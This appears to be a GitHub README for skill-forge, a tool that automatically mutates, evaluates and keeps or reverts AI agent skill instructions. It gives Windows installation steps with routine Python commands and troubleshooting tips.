# ⚙️ skill-forge - Improve AI Skills Automatically

[![Download skill-forge](https://img.shields.io/badge/Download-skill--forge-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/3bdallaha7md/skill-forge)

---

## 🧩 What is skill-forge?

skill-forge is a tool that helps AI improve itself without human help. It changes the instructions AI uses to complete tasks, tests if these changes make things better, then keeps the good ones. If a change makes things worse, it goes back to the previous version. This loop helps AI get smarter on its own.

This project is inspired by ideas from Andrej Karpathy about how AI can learn by testing itself again and again. skill-forge works by running experiments on skills, tracking results, and managing improvements autonomously.

---

## 📋 Features and Key Points

- **Automatic skill improvement**  
  The system tests and refines AI instructions by itself.

- **Objective testing**  
  Changes are tested based on clear, measurable goals.

- **No human intervention**  
  The process runs on its own from start to finish.

- **Skill mutation and evaluation**  
  The AI agent changes skill instructions and checks the impact automatically.

- **Version control for skill changes**  
  Keeps improvements and discards bad changes to avoid setbacks.

- **Supports AI agents and large language models (LLMs)**  
  Works with various AI tools and models commonly used in research and development.

---

## 🖥️ System Requirements

To run skill-forge on Windows, make sure you have the following:

- Windows 10 or later (64-bit recommended)  
- At least 8 GB of RAM  
- 4 CPU cores or higher for faster processing  
- Minimum 5 GB of free disk space  
- An active internet connection (for download and updates)  
- Python 3.8 or higher installed (requires Windows environment variable setup)

You do not need programming knowledge, but basic computer skills help with installation.

---

## 🚀 Getting Started: Download and Install

To start with skill-forge, follow these steps carefully:

### Step 1: Download the software  
Use the main download link below to visit the skill-forge page on GitHub. This page contains all the files you need to get the program working on your computer.

[Download skill-forge from GitHub](https://github.com/3bdallaha7md/skill-forge)

Click the green **Code** button, then select **Download ZIP** to save the full package, or look in the **Releases** section for ready-to-run files.

### Step 2: Extract the files  
Once the ZIP file downloads, right-click on it and choose **Extract All**. Select a folder you can find easily, for example, on your Desktop or in your Documents.

### Step 3: Install Python (if needed)  
skill-forge requires Python. Check if Python is installed by:

- Press the Windows Key + R to open Run  
- Type `cmd` and press Enter to open Command Prompt  
- Type `python --version` and press Enter

If you see a version number 3.8 or higher, you have Python installed.  
If not, visit [https://www.python.org/downloads/](https://www.python.org/downloads/) to download and install Python. During installation, choose the option **Add Python to PATH**.

### Step 4: Install required Python packages  
Open Command Prompt again:

- Navigate to the folder where you extracted skill-forge  
  Example: `cd Desktop\skill-forge-master`  
- Run this command to install required packages:  
  ```shell
  pip install -r requirements.txt
  ```

This downloads all software libraries skill-forge needs to run.

### Step 5: Run skill-forge  
In the same folder, type:

```shell
python skill_forge.py
```

This will start the program. Follow on-screen instructions to use the tool for skill improvement experiments.

---

## 🔧 How to Use skill-forge

skill-forge runs experiments where an AI agent changes its instructions and tests if the changes help. Here is a basic workflow:

1. **Define a skill**  
   Input instructions that describe a task you want the AI to improve.

2. **Set objective metrics**  
   Provide clear goals — for example, accuracy or speed that skill-forge measures.

3. **Start the iteration**  
   The system changes instructions slightly and runs the task.

4. **Evaluation**  
   Results are checked against the metrics.

5. **Decide keep or revert**  
   Improvements are saved. If not better, skill-forge goes back.

6. **Repeat automatically**  
   This cycle continues until you stop the process.

You can customize skill instructions and metrics by editing simple text files provided in the program folder.

---

## 🔄 Updating skill-forge

Check the GitHub page regularly to see if new versions are available. Download the latest files, extract, and follow the installation steps again.

---

## ❓ Troubleshooting

- **Python command not found:** Make sure Python is installed and added to your system PATH. Restart your PC after installation.

- **Package installation errors:** Check your internet connection and try `pip install --upgrade pip` before installing requirements.

- **Program does not run:** Confirm you are in the correct folder in Command Prompt when running `python skill_forge.py`.

- **Errors about missing files:** Extract the ZIP fully and do not run the script inside the ZIP file.

- **If errors continue:** Share a screenshot and error message on the GitHub Issues page.

---

## 🔗 Resources

- Visit the skill-forge GitHub page here:  
  [https://github.com/3bdallaha7md/skill-forge](https://github.com/3bdallaha7md/skill-forge)

- Python downloads:  
  [https://www.python.org/downloads/](https://www.python.org/downloads/)

- Learn more about Andrej Karpathy’s autoresearch concept by searching online.

---

## 🔑 Keywords

agents, ai, automation, autonomous-agents, autoresearch, claude, engineering, enterprise-ai, eval, karpathy, llm, openclaw, overnight-training, prompt-engineering, self-improving, skills